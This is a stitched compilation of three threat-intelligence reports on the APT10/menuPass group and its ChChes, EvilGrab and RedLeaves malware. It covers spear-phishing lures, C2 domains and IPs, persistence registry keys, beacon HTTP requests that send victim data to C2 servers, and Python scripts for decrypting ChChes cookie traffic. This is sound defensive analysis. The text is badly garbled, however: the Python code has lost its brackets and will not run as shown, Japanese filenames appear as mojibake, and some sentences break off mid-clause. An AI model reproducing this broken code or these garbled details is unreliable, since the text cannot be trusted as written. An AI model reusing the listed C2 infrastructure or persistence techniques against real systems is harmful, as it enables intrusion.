In addition to using PlugX and Poison Ivy (PIVY), both known to be used by the group, they also used a new Trojan called “ChChes” by the Japan Computer Emergency Response Team Coordination Center (JPCERT).\\xa0 In contrast to PlugX and PIVY, which are used by multiple campaigns, ChChes appears to be unique to this group. An analysis of the malware family can be found later in this blog.\\nInterestingly, the ChChes samples we observed were digitally signed using a certificate originally used by HackingTeam and later part of the data leaked when they were themselves hacked. Wapack labs also observed a similar sample targeting Japan in November. It’s not clear why the attackers chose to use this certificate, as it was old, had been leaked online, and had already been revoked by the time they used it. Digital certificates are typically used because they afford an air of legitimacy, which this one definitely does not.\\nThe attackers spoofed several sender email addresses to send spear phishing emails, most notably public addresses associated with the Sasakawa Peace Foundation and The White House. All the spear phishes were socially engineered with subjects appropriate for the target and the apparent sender. One of the more interesting subject lines was used in the White House attack; “UNCLASSIFIED The impact of Trump’s victory to Japan,” sent two days after the election.\\xa0 Most of the attacks against academics involved webmail addresses using names of academics but are not tied to those academics openly online. However, all the spear phish recipients used email addresses tied to them online.\\nFigure 1. Recent menuPass activity and some ties to older infrastructure\\nThe C2 infrastructure in these attacks is largely actor registered, with only a few Dynamic Domain Name System (DDNS) domains. menuPass typically makes use of a mix of DDNS and actor-registered domains in their attack campaigns. All of the related hashes and C2s are in appendix at the end of this blog.\\nTies to menuPass\\nThere is not much public information about the APT campaign called menuPass (also known as Stone Panda and APT10).\\xa0 A paper from FireEye in 2013 on several campaigns using PIVY included menuPass as one of them.\\xa0 A later blog added some additional details. The group name is derived from one of the passwords they use with PIVY in their attacks. Believed to have started activity in 2009 and to originate from China, the group initially was known for targeting US and overseas defense contractors but broadened their targeting as time passed. They have targeted Japanese organizations since at least 2014.\\nThe newer ChChes malware family uses an import hash (bb269704ba8647da97377440d403ae4d) shared with other tools used by menuPass, affording an initial link. However, the ties are most strongly proved through infrastructure analysis, which shows a number of links between the newer infrastructure used in these attacks and older infrastructure publicly associated with the group. The three circled domains represent C2s publicly reported as tied to menuPass, linked to domains not previously publicly reported as associated. These are only a few of multiple overlaps analysts can find while researching menuPass infrastructure. The circled known domains are the first three below:\\napple.cmdnetview.com\\nfbi.sexxxy.biz\\ncvnx.zyns.com\\ncia.toh.info\\n2014.zzux.com\\niphone.vizvaz.com\\nFigure 2. menuPass infrastructure overlaps\\nTwo of these domains can further be tied into the newer C2 infrastructure. Again, these are only a few of the overlaps that can be uncovered by analyzing the infrastructure used by menuPass. The domains in the below figure are:\\ncia.toh.info\\n2014.zzux.com\\nwchildress.com\\nlion.wchildress.com\\nkawasaki.unhamj.com\\nsakai.unhamj.com\\nkawasaki.cloud-maste.com\\nfukuoka.cloud-maste.com\\nyahoo.incloud-go.com\\nmsn.incloud-go.com\\nwww.mseupdate.ourhobby.com\\ncontractus.qpoe.com\\nFigure 3. Ties between new and older infrastructure.\\nAdditionally, the passwords in the PIVY samples also fit known passwords used by the group – three samples use “menuPass” and the other uses “keaidestone.”\\xa0 With these data points, we assess with high confidence the recent attacks were conducted by the menuPass group.\\nFollowing is our analysis of the ChChes malware family.\\nMalware Analysis\\nFor this analysis, Unit 42 looked at the following file:\\nMD5\\nc0c8dcc9dad39da8278bf8956e30a3fc\\nSHA1\\n009b639441ad5c1260f55afde2d5d21fc5b4f96c\\nSHA256\\n6605b27e95f5c3c8012e4a75d1861786fb749b9a712a5f4871adbad81addb59e\\nCompile Time\\n2016-11-24 01:31:37 UTC\\nThis malware is provided with an icon that appears to be that of a Microsoft Word document, as we can see in the image below.\\nFigure 4. Icon used for ChChes\\nAdditionally, we discovered that the samples identified in attacks against Japanese organizations were digitally signed using the certificate originally used by the Italian-based company, HackingTeam. Readers may recall that HackingTeam was compromised and subsequently had a large amount of internal data exposed in July 2015. This data included a wealth of code used by the organization, including certificates. The certificate in question was fairly old, and expired on August 4th, 2012. On July 10th, 2015, the certificate was revoked.\\nFigure 5.\\xa0 Digital signing of ChChes\\nFigure 6.\\xa0 Certificate revocation\\nMultiple instances of malware have been discovered using this certificate since it was originally leaked in 2015. It is unclear why the actors decided to use this certificate that is tied to known malicious samples for their own samples. One possibility may be to make attribution more difficult for analysts researching these threats.\\nWhen the malware is initially run, it will first decrypt an embedded stub of code within the malware prior to executing it. This stub has many characteristics seen in shellcode, and begins by creating a new Import Address Table (IAT). This new IAT is then referenced throughout the remainder of the code when calling Windows APIs. The following snippet of assembly shows the newly created IAT being referenced to call various functions, such as GetProcessHeap, RtlAllocateHeap, RtlReAllocateHeap, and InternetReadFile.\\nFigure 7.\\xa0 Newly created IAT being used to call Windows API functions\\nAfter the IAT has been generated, the malware will determine the path of %TEMP% and set its current working directory to this value. ChChes proceeds to collect the following information about the victim:\\nHostname\\nProcess Identifier (PID)\\nCurrent working directory (%TEMP%)\\nWindow resolution\\nMicrosoft Windows version\\nThis information is aggregated into a string such as the following:\\nWBQTLJRH9553618*2564?3618468394?C:\\\\\\\\Users\\\\\\\\ADMINI~1\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp?1.4.1 (1024×768)*6.1.7601.17514\\nNote that in the string above, the ‘3618468394’ and ‘1.4.1’ strings are hardcoded within the malware itself. These may indicate versions of the malware or campaign identifiers, however, this has not been confirmed.\\nAfter this data has been aggregated, it is uploaded to a hardcoded command and control (C2) server via HTTP. The data is embedded within the ‘Cookie’ HTTP header, as seen below\\nFigure 8.\\xa0 Initial HTTP beacon for ChChes\\nThe URI used above is randomly generated for each HTTP request made by ChChes. The data embedded within the Cookie header is encrypted using a unique technique. For each key/value pair, separated by a ‘;’, the malware will first perform a MD5 hash of the key, and extract the middle 16 bytes. The value is base64-decoded after the string is unquoted. Finally, the base64-decoded data is decrypted using RC4 with the previously obtained 16 bytes. All of the data is concatenated to form the final, decrypted data.\\nThe following Python code shows an example of decoding the supplied Cookie field:\\nimport urllib\\nimport base64\\nfrom binascii import *\\nimport hashlib\\ndef md5_get_middle(data):\\nm = hashlib.md5()\\nm.update(data)\\no = m.digest()\\nhexed = hexlify(o)\\nreturn hexed8:24\\ndef rc4_crypt(data, key):\\nS = range(256)\\nj = 0\\nout = \\nfor i in range(256):\\nj = (j + Si + ord( keyi % len(key) )) % 256\\nSi , Sj = Sj , Si\\ni = j = 0\\nfor char in data:\\ni = ( i + 1 ) % 256\\nj = ( j + Si ) % 256\\nSi , Sj = Sj , Si\\nout.append(chr(ord(char) ^ S(Si + Sj) % 256))\\nreturn \\'\\'.join(out)\\ncookie_string = \\'OtKoVg=jlIt2Eh55%2F%2F38%2FJbKlZpYFNNFhXgOgc0zzNqAxvls8edznJy4k%2BpxKUl1GG15OTRuC%2Blc5R6WGCmOHyPNObeV2OL0ppBty%2Bj3JOsKlUupX%2Fpk6WumT8yLGWtHVQZHZhUxdY%3D;KR9nHItU=MTBOzPjjkPOom89lXeC0A%2Fc%3D\\'\\nall_decrypted = \"\"\\nsub_strings = cookie_string.split(\";\")\\nfor s in sub_strings:\\nkey, data = s.split(\"=\")\\nnew_key = md5_get_middle(key)\\nnew_data = base64.b64decode(urllib.unquote(data))\\ndecrypted = rc4_crypt(new_data, new_key)\\ndecrypted_data = decrypted.split(key)1\\nall_decrypted += decrypted_data\\nprint \"Decrypted String:\"\\nprint repr(all_decrypted)\\n1234567891011121314151617181920212223242526272829303132333435363738394041\\nimport urllibimport base64from binascii import *import hashlib\\xa0def md5_get_middle(data):\\xa0\\xa0m = hashlib.md5()\\xa0\\xa0m.update(data)\\xa0\\xa0o = m.digest()\\xa0\\xa0hexed = hexlify(o)\\xa0\\xa0return hexed8:24\\xa0def rc4_crypt(data, key):\\xa0\\xa0S = range(256)\\xa0\\xa0j = 0\\xa0\\xa0out = \\xa0\\xa0for i in range(256):\\xa0\\xa0\\xa0\\xa0j = (j + Si + ord( keyi % len(key) )) % 256\\xa0\\xa0\\xa0\\xa0Si , Sj = Sj , Si\\xa0\\xa0i = j = 0\\xa0\\xa0for char in data:\\xa0\\xa0\\xa0\\xa0i = ( i + 1 ) % 256\\xa0\\xa0\\xa0\\xa0j = ( j + Si ) % 256\\xa0\\xa0\\xa0\\xa0Si , Sj = Sj , Si\\xa0\\xa0\\xa0\\xa0out.append(chr(ord(char) ^ S(Si + Sj) % 256))\\xa0\\xa0return \\'\\'.join(out)\\xa0cookie_string = \\'OtKoVg=jlIt2Eh55%2F%2F38%2FJbKlZpYFNNFhXgOgc0zzNqAxvls8edznJy4k%2BpxKUl1GG15OTRuC%2Blc5R6WGCmOHyPNObeV2OL0ppBty%2Bj3JOsKlUupX%2Fpk6WumT8yLGWtHVQZHZhUxdY%3D;KR9nHItU=MTBOzPjjkPOom89lXeC0A%2Fc%3D\\'\\xa0all_decrypted = \"\"sub_strings = cookie_string.split(\";\")for s in sub_strings:\\xa0\\xa0key, data = s.split(\"=\")\\xa0\\xa0new_key = md5_get_middle(key)\\xa0\\xa0new_data = base64.b64decode(urllib.unquote(data))\\xa0\\xa0decrypted = rc4_crypt(new_data, new_key)\\xa0\\xa0decrypted_data = decrypted.split(key)1\\xa0\\xa0all_decrypted += decrypted_data\\xa0print \"Decrypted String:\"print repr(all_decrypted)\\nThe script above produces the following output:\\nDecrypted String:\\n\\'AWBQTLJRH9553618*2564?3618468394?C:\\\\\\\\Users\\\\\\\\ADMINI~1\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp?1.4.1 (1024x768)*6.1.7601.17514\\'\\n12\\nDecrypted String:\\'AWBQTLJRH9553618*2564?3618468394?C:\\\\\\\\Users\\\\\\\\ADMINI~1\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp?1.4.1 (1024x768)*6.1.7601.17514\\'\\nThe initial ‘A’ character witnessed in the output above instructs the remote server that this is an initial beacon, or the first expected request sent by ChChes.\\nThe C2 will respond with a ‘Set-Cookie’ header that contains the middle 16 bytes of the MD5 hash performed against the hostname and PID.

This would result in a string of ‘500089dadf52ae0b’ in this particular example. The ‘Base64-Encoded Data’ field contains a fairly complex structure that will store a module that is to be loaded and subsequently run by ChChes.\\nA visualization of this network communication can be seen in the following figure:\\nFigure 10. Network flow of ChChes\\nChChes acts as an initial infiltration point on a victim machine. It has the ability to load additional code that in turn may accomplish any number of tasks. During analysis, no C2 servers were found to be active, and Unit 42 was unable to identify any modules being loaded by ChChes. However, the JPCERT also recently analyzed this family and was able to collect modules that give ChChes the following functions:\\nEncryption of communication by AES\\nExecute shell command\\nUploading and downloading files\\nLoading and executing the DLL\\nTask list of bot command\\nHowever, the lack of persistence built into ChChes suggests that it by itself is not intended to run on a victim’s machine for long periods of time.\\xa0 In a successful intrusion, it may be only a first stage tool used by the attackers to orient where they landed in a network, and other malware will be deployed as a second stage layering for persistence and additional access as the attackers move laterally through a network.\\nConclusion\\nThese attacks show Japan continues to be a target of interest to APT campaigns. menuPass has targeted individuals and organizations in Japan since at least 2014, and as the same organizations and academics were largely targeted each month in these attacks, it further shows menuPass is persistent in attempts to compromise their targets.\\xa0 menuPass also heavily favors spear phishing, and so takes steps to socially engineer their spear phishes for maximum appearance of legitimacy. This, and their persistence, highlights the need for training and awareness of spear phishing on the part of both individuals and organizations likely to be targeted. menuPass is an ongoing APT campaign with a broad range of targets and will likely continue to target Japan in the future.\\nPalo Alto Networks customers are protected from these malware families and C2 infrastructure by:\\nAll C2 domains are flagged as malicious in Threat Prevention and PAN-DB\\nAll three families are properly tagged malware by WildFire.

All rights reserved.', 'ChChes – Malware that Communicates with C&C Servers Using Cookie Headers - JPCERT/CC Eyes | JPCERT Coordination Center official Blog\\nJPCERT/CC Eyes\\nJPCERT Coordination Center official Blog\\nLanguage:\\n日本語\\nEnglish\\nTop\\xa0>\\xa0List of “Malware”\\xa0>\\xa0ChChes – Malware that Communicates with C&C Servers Using Cookie Headers\\nJPCERT/CC\\nFebruary 15, 2017\\nChChes – Malware that Communicates with C&C Servers Using Cookie Headers\\nChChes\\nEmail\\nSince around October 2016, JPCERT/CC has been confirming emails that are sent to Japanese organisations with a ZIP file attachment containing executable files. The targeted emails, which impersonate existing persons, are sent from free email address services available in Japan. Also, the executable files’ icons are disguised as Word documents. When the recipient executes the file, the machine is infected with malware called ChChes.\\nThis blog article will introduce characteristics of ChChes, including its communication.\\nZIP files attached to Targeted Emails\\nWhile some ZIP files attached to the targeted emails in this campaign contain executable files only, in some cases they also contain dummy Word documents. Below is the example of the latter case.\\nFigure 1: Example of an attached ZIP file\\nIn the above example, two files with similar names are listed: a dummy Word document and an executable file whose icon is disguised as a Word document. By running this executable file, the\\xa0machine will be infected with ChChes. JPCERT/CC has confirmed the executable files that have signatures of a specific code signing certificate. The dummy Word document is harmless, and its contents are existing online articles related to the file name “Why Donald Trump won”. The details of the code signing certificate is described in Appendix A.\\nCommunication of ChChes\\nChChes is a type of malware that communicates with specific sites using HTTP to receive commands and modules. There are only few functions that ChChes can execute by itself. This means it expands its functions by receiving modules from C&C servers and loading them on the memory.\\nThe following is an example of HTTP GET request that ChChes sends. Sometimes, HEAD method is used instead of GET.\\nGET /X4iBJjp/MtD1xyoJMQ.htm HTTP/1.1\\nCookie: uHa5=kXFGd3JqQHMfnMbi9mFZAJHCGja0ZLs%3D;KQ=yt%2Fe(omitted)\\nAccept: */*\\nAccept-Encoding: gzip, deflate\\nUser-Agent: user agent\\nHost: host name\\nConnection: Keep-Alive\\nCache-Control: no-cache\\nAs you can see, the path for HTTP request takes /random string.htm, however, the value for the Cookie field is not random but encrypted strings corresponding to actual data used in the communication with C&C servers. The value can be decrypted using the below Python script.\\ndata_list = cookie_data.split(\\';\\')\\ndec = \\nfor i in range(len(data_list)):\\ntmp = data_listi\\npos = tmp.find(\"=\")\\nkey = tmp0:pos\\nval = tmppos:\\nmd5 = hashlib.md5()\\nmd5.update(key)\\nrc4key = md5.hexdigest()8:24\\nrc4 = ARC4.new(rc4key)\\ndec.append(rc4.decrypt(val.decode(\"base64\"))len(key):)\\nprint(\"* decoded: \" + \"\".join(dec))\\nThe following is the flow of communication after the\\xa0machine is infected.\\nFigure 2: Flow of communication\\nThe First Request\\nThe value in the Cookie field of the HTTP request that ChChes first sends (Request 1) contains encrypted data starting with ‘A’. The following is an example of data sent.\\nFigure 3: Example of the first data sent\\nAs indicated in Figure 3, the data which is sent contains information including computer name. The format of the encrypted data differs depending on ChChes’s version. The details are specified in Appendix B.\\nAs a response to Request 1, ChChes receives strings of an ID identifying the infected\\xa0machine from C&C servers (Response 1). The ID is contained in the Set-Cookie field as shown below.\\nFigure 4: Example response to the first request\\nRequest for Modules and Commands\\nNext, ChChes sends an HTTP request to receive modules and commands (Request 2). At this point, the following data starting with ‘B’ is encrypted and contained in the Cookie field.\\nBID to identify the infected machine\\nAs a response to Request 2, encrypted modules and commands (Response 2) are sent from C&C servers. The following shows an example of received modules and commands after decryption.\\nFigure 5: Decrypted data of modules and commands received\\nCommands are sent either together with modules as a single data (as above), or by itself. Afterwards, execution results of the received command are sent to C&C servers, and it returns to the process to receive modules and commands. This way, by repeatedly receiving commands from C&C servers, the infected\\xa0machines will be controlled remotely.\\nJPCERT/CC’s research has confirmed modules with the following functions, which are thought to be the bot function of ChChes.\\nEncrypt communication using AES\\nExecute shell commands\\nUpload files\\nDownload files\\nLoad and run DLLs\\nView tasks of bot commands\\nEspecially, it was confirmed that the module that encrypts the communication with AES is received in a relatively early stage after the infection. With this feature, communication with C&C servers after this point will be encrypted in AES on top of the existing encryption method.\\nSummary\\nChChes is a relatively new kind of malware which has been seen since around October 2016.

malware, tools and infrastructure used by the China - based threat actor, APT10. This report is a technical Annex provided in addition to Systems have conducted on both this threat actor and two major campaigns we have observed this malware being used in. From 2009 to mid - 2016, APT10 have used malware that is known to be popular among China - based threat actors. We have categorised the malwa re used by APT10 into two different types , tactical and sustained. Tactical malware is used to gain a foothold on target systems, and sustained malware is used to maintain access and act as a backdoor into the network. Since mid - 2016 we have seen APT10 ins tigate a retooling of malware, through a combination of internal software development and modification of open source code. Supplementing its malware capability, APT10 have repurposed scripts and tools to aid with its operations once access to a victim\\'s n etwork has been established. Figure 1 when targeting MSPs Operation Cloud Hopper Technical Annex 4 APT10: Malware Tactical Malware We have observed the EvilGrab, ChChes and RedLeaves malware families used as the primary method for initial exploitation to gain entry to the victim. PwC UK families . O ften deployed via spear phishing, they are lightweight, have particular capabilities and are designed to facilitate system identification and later al movement. The first of these families, EvilGrab, was likely to have last been used by APT10 in a 2016 spear phishing campaign. We have observed ChChes and RedLeaves being used to achieve the same objectives as EvilGrab , and we assess that this activity is almost certainly APT10. The following sections detail these families, their functionality and use by the threat actor. EvilGrab EvilGrab, as per i audio, video and screenshots of infected hosts and send the captured media to command and control servers. It possesses common reconnaissance capabilities such as attempting to steal application credentials, instant messaging chat logs, keystrokes and allows the threat actor remote access to the compro mised system. 1 APT10 frequently deploy s EvilGrab via email, using malicious Microsoft Office documents as part of spear phishing campaigns. It attempts to inject into running processes, focussing on security products and native Windows processes. In previous campaigns, APT10 h as used EvilGrab to exploit targets in Japan and the wider South - East Asia region. In one instance, the 2016 Taiwanese election was used as a spear phishing theme to deliver the malware. The rest of this section focuses on one observed sample within this w ider campaign, and it is almost certain that APT10 have used the same techniques repeatedly. 2016 !B)»)+4E+Ç0— /œ&ì 20160105.xls 2016 Taiwan president election watching group schedule . 2 Once the spreadsheet is op ened, CVE - 2012 - 0158 is exploited and a file called 6EC5.tmp is dropped in the %TEMP% folder. The file is in fact an executable binary which, once opened, spawns a ctfmon.exe process and clones itself in the %USERPROFILE% directory as a file called IEChecker.exe . Aside from creating IEChecker.exe , the malicious ctfmon.exe process also creates a set of registry keys which contain encoded data. These are in fact modules used by the malware and this behaviour is indicative of EvilGrab: HKCU \\\\ Software \\\\ rar \\\\ e HKCU \\\\ Software \\\\ rar \\\\ s HKCU \\\\ Software \\\\ rar \\\\ data HKCU \\\\ Software \\\\ rar \\\\ ActiveSettings HKCU \\\\ Software \\\\ Classes \\\\ VirtualStore \\\\ MACHINE \\\\ Software \\\\ rar \\\\ e The malware establishes persistence by setting an Autorun key called ctfmon.exe to ensure IEChecker.exe is executed on startup. 1 http://blog.trendmicro.com/trendlabs - security - intelligence/evilgrab - malware - family - used - in - targeted - attacks - in - asia/ 2 http://pwc.blogs.com/cyber_security_updates/2016/03/taiwant - election - targetting.html Operation Cloud Hopper Technical Annex 5 Figure 2 : An AutoRun key is set by the ctfmon.exe process to ensure IEChecker.exe is executed on startup. The malware also beacons to the command and control (C2) server 192.225.226.98 on port 8080 by sending TCP SYN p ackets approximately every 30 seconds. ChChes ChChes, known in PwC UK threat intelligence reporting as Scorpion, is a new malware family that surfaced in late 2016. Analysis shows it to have relatively limited functionality. As with EvilGrab, ChChes appear s to be designed to establish an initial presence and act as a system fingerprinting utility. To date, we have primarily seen APT10 use ChChes to target Japanese organisations and government departments. This is based on file naming conventions and the nam ing of some C2 domains which appear to mimic the legitimate domains of specific organisations. For example: Malware Filename Translation 1102 >8t8?Rí ( )mMã )._exe 1102 Mainich Newspaper (answer)._exe 2016 A4 ˆ˙ 1025.exe 2016 Prefectural University Symposium A4_1025.exe !ˆ%hb²Oð (28.11.07).exe Business contact invitation (28.11.07).exe \"ı!IGù&ƒ .exe Regarding provision of Individual number.exe 5 =ñ%ãÿ e Japan - US expansion deterrence conference ( e ) &†%ã!©&†7èL` .exe Foundation of Russian historical association and Composing a unity state history textbook .exe .˘#÷\"li+9ðOﬁ+Ÿ9…b©Jt .exe Notice of Change of Security Guarantee Treaty.exe 29 .˘\"l4µ6_\\\\‘ ( 9¹.)LÎ ).exe Japan - U.S. Security Strategy Dialogue Recommendation (Undetermined).exe 11 9Š8?-õRł!© .exe November will be the new school.exe jﬂ ‘\\\\6Z÷ .exe US - Japan Relations Important List.exe Table 1 : An example of Japanese - language filenames used in ChChes campaigns Our initial analysis of this malware is based on a file named 3û%± .exe , which broadly translates to Notice of Change of Security Guarantee Treaty , with an MD5 hash of 75500BB4143A052795EC7D2E61AC3261 . This file was submitted to VirusTotal by a user in Japan . One of the most recognisable features of this malware, is the presence of icons typically associated Operation Cloud Hopper Technical Annex 6 have been used to obfuscate the executable file type. In this particular sample they are Microsoft Word icons, as shown in Figure 3 . Figure 3 : Sample Microsoft Word icons The file uses a code wrapper to hide the actual payload from static analysis tools. In this case, the wrapper relies on the VirtualAlloc function to allocate memory buffers required for the payload. When launched, the application creates a dummy window usi ng a custom window class that installs its own routine to handle messages from the Windows message queue. The program then starts processing the messages sent to it by the system. The code responsible for this functionality is shown in Figure 4 . Figure 4 : Sample is using a standard Windows application template for a typical Windows application and is commonly used by legitimate programs. Malware authors use the same template as a way to thwart analysis performed by automated systems. This is also used to hide the malicious code from the analysts looking at the sample with a disassembler Windows program template is a more sinister version of wrapping as it impersonates a legitimate application. Operation Cloud Hopper Technical Annex 7 The core functionality for decrypting and executing the malicious payload is launched inside the window procedure installed during the wi ndow registration process as shown in Figure 5 . Figure 5 : The call - back procedure is installed during window class registration The handlin g_procedure is responsible for processing messages sent to the window by the operating system. These typically include messages informing the window of events affecting the window\\'s state, such as a user pressing a key, moving or clicking a mouse button or a window being minimised. The routine is called immediately after the window is created and one of the first messages to be processed is WM_CREATE - the message sent by the operating system to let the window finalise its initialisation. In this particular case, a procedure, run_payload_4 , is called as shown in Figure 6 . Figure 6 : The call - back procedure decrypts and runs the payload Operation Cloud Hopper Technical Annex 8 After executing, the malware sleeps for 60 seconds and then attempts to communicate with the C2. It sends details of the system to the C2, including the system name and version of the OS, as well as any stolen credentials. The malware makes adjustments to the us before beginning C2 beaconing. ChChes targets the credentials stored inside Internet Explorer and has the capability to resolve and alter the proxy configuration. It achieves this via the function WinHttpGetDefaultProxyConfiguration , or by enumerating the configuration files inside the %APPDATA% \\\\ Mozilla \\\\ Firefox \\\\ folder and looking for proxy - related tokens. The code is heavily obfuscated, via the use of position - independence alongside other techniques. This code is typically harder to wr ite when compared to programs loaded using a RunPE technique. We assess this was likely done to deter security researchers ability to perform static analysis. The APIs are resolved dynamically and stored inside a dedicated structure. They are also obfusca ted as a result of manipulating the relative offsets of the API calls, an example of which is depicted in Figure 7 . Figure 7 : A routine obf uscating API calls Figure 8 shows the malware attempting to hide the offset to the API table which is resolved during run - time. Implementing this technique has little impact as standard reverse engineering techniques can be used to analyse the code. Figure 8 : An example showing how the routine is being used Another interesting aspect of this sample is that it uses the printf function to output debugging messages. Since the application is compiled as a GUI program, these messages are not usually visible to the end user. As part of our analysis we were able to patch the malware and view the printed debug messages, as seen in Figure 9 . Operation Cloud Hopper Technical Annex 9 Figure 9 : The hidden debug messages can be made visible The debug messages visible in the output show another unusual feature of the malware the use of HEAD requests, broadly equivalent to a HTTP GET request but without t field is used to communicate the system information and crede ntials described above. Figure 10 shows output in which the HEAD request is visible. Figure 10 : Output showing HEAD request Two unique user agents have been observed in samples of the ChChes family: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.307 29; Media Center PC 6.0; .NET4.0C; .NET4.0E) Operation Cloud Hopper Technical Annex 10 The ChChes family uses an algorithm to create a mutex at runtime. Using a sequence of instructions, it builds a buffer with dynamic data combined with hard coded data. It then MD5 hashes the dynamic data, and th e resulting hash is converted to its hexadecimal form 5D0E6AB3A85EDFEA9AA3F2923B4C66F3 . The resulting value is used as a base for the mutex name formed by extracting a sub - string, in this case A85EDFEA9AA3F292 . Many of the samples are digitally signed with a certificate belonging to HackingTeam, a self - described - 2012, and was likely obtained during the HackingTeam breach of 2015. 3 If executed, the malware begins by remov ing itself from the current directory and copying itself to the C: \\\\ Users \\\\ <USER> \\\\ AppData \\\\ Roaming \\\\ notron.exe The new filename varies from sample to sample, likely imitating Norton An tivirus but with a couple of example of a corresponding registry entry is shown below: HKCU \\\\ Software \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run \\\\ ISeC Croot Readr To date, the collected ChChes samples communicate to the following C2 domains: scorpion.poulsenv.com kawasaki.unhamj.com kawasaki.cloud - maste.com zebra.wthelpdesk.com dick.ccfchrist.com area.wthelpdesk.com Trout.belowto.com ChChes PowerSploit APT10 has also been observed leveraging PowerSploit , 4 a framework commonly used to inject shellcode into other running processes. It has been reported as coming from a ZIP file attached to a spear phishing email, as reported by one individual on Twitter in 2017 . 5 3 https://www.wired.com/2015/07/hacking - team - leak - shows - secretive - zero - day - exploit - sales - work/ 4 https://github.com/Powe rShellMafia/PowerSploit/blob/master/CodeExecution/Invoke - Shellcode.ps1 5 https://twitter.com/Wjenga/status/822282843766128640 Operation Cloud Hopper Technical Annex 11 Figure 11 : Spear p hishing email from Twitter According to another source 6 29 &É%Ê2˛ )Þ2z#æ .zip alternative communication method.

Operation Cloud Hopper Technical Annex 13 Figure 15 : Decoy document used by APT10 to target the Japanese education sector Simultaneously, the downloaded PowerShell script executes shellcode similar to that from the original PowerSploit project and injects ChChes shellcode into PowerShell itself. A HTTP connection is established with hamiltion.catholicmmb.com to retrieve ChC hes commands and/or additional modules. RedLeaves The latest malware family to be attributed to APT10 is a newly discovered sample, referred to as RedLeaves. It was first reported by Lac Watch 7 in late February 2017 and was attributed to APT10 due to shared infrastructure with ChChes and also code overlap with PlugX. Further reporting by Japan CERT suggests that the . 8 An in - dept h analysis of RedLeaves was also published by NCC Group. 9 Analysis has revealed that RedLeaves is a feature rich malware family with the capability to tunnel and reverse proxy traffic, dump browser based credentials and, download and execute files. It is h ighly likely that RedLeaves is used as an initial payload, packaged and deployed via spear phishing techniques, and then used to further deploy sustained malware such as PlugX, or more recently Quasar. 7 https://www.lac.co.jp/lacwatch/people/20170223_001224.html 8 http ://blog.jpcert.or.jp/2017/04/redleaves --- malware - based - on - open - source - rat.html 9 https://github.com/nccgroup/Cyber - Defence/blob/master/Technical%20Notes/Red%20Leaves/Red%20Leaves%20technical%20note%20v1.0.pdf Operation Cloud Hopper Technical Annex 14 Figure 16 : Code comparison between RedLeaves and PlugX 10 Analysis of the initial binary shows similar social engineering techniques used by the ChChes malware, with Microsoft Office document icons being an embedded resource to disguise the true format of the binaries . We have identi fied the following three files created by the initial binary; a binary file of unknown format, a malicious Windows Dynamically - Linked Library (DLL) compiled for a 32 - bit architecture, and a legitimately signed Windows executable used for loading the malici ous DLL. During our analysis we identified the following three files created by our sample in the C: \\\\ Users \\\\ %USERPROFILE% \\\\ AppData \\\\ Local \\\\ Temp \\\\ directory: handkerchief.dat obedience.exe starburn.dll 10 http://blog.jpcert.or.jp/2 017/04/redleaves --- malware - based - on - open - source - rat.html Operation Cloud Hopper Technical Annex 15 Analysis of the first dropped file, handkerchief.dat , sugge sts it is encrypted given it has an entropy of 6.99. Starburn.dll exports 238 functions, with the main function loading and decrypting handkerchief.dat . Decryption of handkerchief.dat results in the creation of two binary objects, the first a shellcode ob ject and the second a payload. The shellcode is 32 - bit, position - independent code responsible for loading the payload. Analysis shows references to API names that are resolved during the shellcode runtime as shown in Figure 17 below. Figure 17 : API Names resolved during runtime Once executed by the shellcode, the DLL will decrypt a mini - configuration stub embedded within its own body. The con figuration file is encrypted with a simple XOR key, 0x53 . The configuration contains the following data: Config Value Usage / Description 67.205.132.17 First C2 IP Address 67.205.132.17 D uplicate entry 144.168.45.116 Second C2 IP Address 443 C2 port number 2017 - 2 - 22 - ALL Bot group ID vv11287GD Mutex name %ProgramFiles% \\\\ Internet Explorer \\\\ iexplore.exe Name of the process which the DLL is to inject Lucky123 Part of the key that is used to encrypt/decrypt C2 communications. Another part of the key is defined as 0xBFD9CBAE C: \\\\ windows \\\\ system32 \\\\ RedLeaves.exe Default name of the executable that will load the malicious DLL, which in turn will load the shellcode fr om the encrypted DAT file, which will be injected into Internet Explorer. The shellcode takes the full path name of its own host process and patches this configuration field with that file name. As a result, the default contents of this field will be repla ced with a temporary filename of the dropped legitimate EXE file, such as %TEMP% \\\\ obedience.exe . The updated name is used by the bot to re - start itself under a specified user Table 2 : RedLeaves configuration data Operation Cloud Hopper Technical Annex 16 During execution R edLeaves was also seen to register two mutexes, both observed during dynamic analysis: vv11287GD RedLeavesCMDSimulatorMutex During our analysis we identified two mechanisms used by RedLeaves to establish persistence on the compromised system. The first is the addition of a shortcut file named persuasion.lnk placed in a Startup folder. If this fails, the malware also attempts to add the following registry keys: HKEY_CURRENT_USER \\\\ SOFTWARE \\\\ EGGORG HKEY_LOCAL_MACHINE \\\\ SOFTWARE \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run \\\\ pedetdata HKEY_LOCAL_MACHINE \\\\ SOFTWARE \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run \\\\ {Default} HKEY_CURRENT_USER \\\\ SOFTWARE \\\\ Microsoft \\\\ Windows \\\\ CurrentVersion \\\\ Run \\\\ pedetdata HKEY_CURRENT_USER \\\\ SOFTWARE \\\\ Micro soft \\\\ Windows \\\\ CurrentVersion \\\\ Run \\\\ {Default} Code analysis shows that two IP addresses are hardcoded into the sample which are known to be associated with APT10 infrastructure, and can be seen in Figure 18 . These IP addresses are also present in the previously mentioned configuration file. Figure 18 : IP Addresses hard coded into RedLeaves The encryption used to communicate with the C2 is based on the RC4 algorithm. The secret key used for encryption is hard coded and equal to 88888888 . A possible interpretation for the choice of the key could be reference to Chinese culture where sequences of the number 8 are considered lucky. Lucky123 earlier interpretation, and also providing a possible clue about attribution. The malware initiates polling of the C2 wit h periodic requests, such as: POST /Btrjvkyim/index.php HTTP/1.1 Connection: Keep - Alive Accept: */* Content - Length: 136 Host: 67.205.132.17:443 2uck.uck.... - 